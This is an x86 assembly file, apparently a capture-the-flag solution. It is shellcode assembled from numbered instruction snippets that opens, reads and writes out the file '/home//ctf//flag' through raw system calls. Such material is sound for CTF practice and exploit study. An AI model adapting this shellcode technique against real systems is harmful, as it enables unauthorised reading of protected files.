section	.text
	global _start       ;must be declared for using gcc
_start:                     ;tell linker entry point
    ; open("/home//ctf//flag")
    ; 1
    pop ebx
	pop ebp
	xor eax,eax
    ; 13
    push eax    ; string end \x00
    ; 11
	push 0x67616c66
	push 0x2f2f6674
	push 0x632f2f65
	push 0x6d6f682f
    ; 9
    push esp
    push ebp
    ; 3
    mov edx,eax
    pop ebx
    ; 3
    mov edx,eax
    pop ebx
    ; 12
    push 1
    push 2
    ; 4
    pop ecx
    pop eax
    ; 13
    push eax
    ; 2
    sub ecx,eax
    pop ebp
    ; 13
    push eax
    ; 2
    sub ecx,eax
    pop ebp
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 0
    int 0x80
    pop ebp
	pop edi
    pop esi
    pop ebx

    ; read(3, buf, 0x11)
    ; 13
    push eax
    ; 13
    push eax
    ; 13
    push eax
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 13
    push eax
    ; 13
    push eax
    ; 13
    push eax
    ; 6
    pop edx
    pop ecx
    pop edx
    ; 9
    push esp
    push ebp
    ; 12
    push 1
    push 2
    ; 4
    pop ecx
    pop eax
    ; 13
    push eax
    ; 4
    pop ecx
    pop eax
    ; 4
    pop ecx
    pop eax
    ; 7
    add ecx,eax
    pop ebx
    ; 0
    int 0x80
    pop ebp
	pop edi
    pop esi
    pop ebx

    ; write
    ; 3
    mov edx,eax
    pop ebx
    ; 3
    mov edx,eax
    pop ebx
    ; 3
    mov edx,eax
    pop ebx
    ; 3
    mov edx,eax
    pop ebx
    ; 3
    mov edx,eax
    pop ebx
    ; 3
    mov edx,eax
    pop ebx
    ; 3
    mov edx,eax
    pop ebx
    ; 3
    mov edx,eax
    pop ebx
    ; 1
    pop ebx
	pop ebp
	xor eax,eax
    ; 12
    push 1
    push 2
    ; 7
    add ecx,eax
    pop ebx
    ; 7
    add ecx,eax
    pop ebx
    ; 8
    add eax,0x2
    ; 8
    add eax,0x2
    ; 0
    int 0x80
    pop ebp
	pop edi
    pop esi
    pop ebx

; end
